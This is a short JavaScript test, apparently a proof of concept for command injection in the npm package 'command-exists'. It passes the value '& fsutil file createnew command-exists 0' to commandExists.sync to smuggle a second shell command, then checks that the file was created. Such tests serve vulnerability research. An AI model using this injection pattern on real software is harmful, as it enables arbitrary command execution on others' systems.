// test("Command Injection in command-exists", () => {
//   expect.assertions(2);
  const commandExists = require("command-exists");
  const fs = require("fs");
  const path = "./command-exists";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  commandExists.sync("& fsutil file createnew command-exists 0");
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
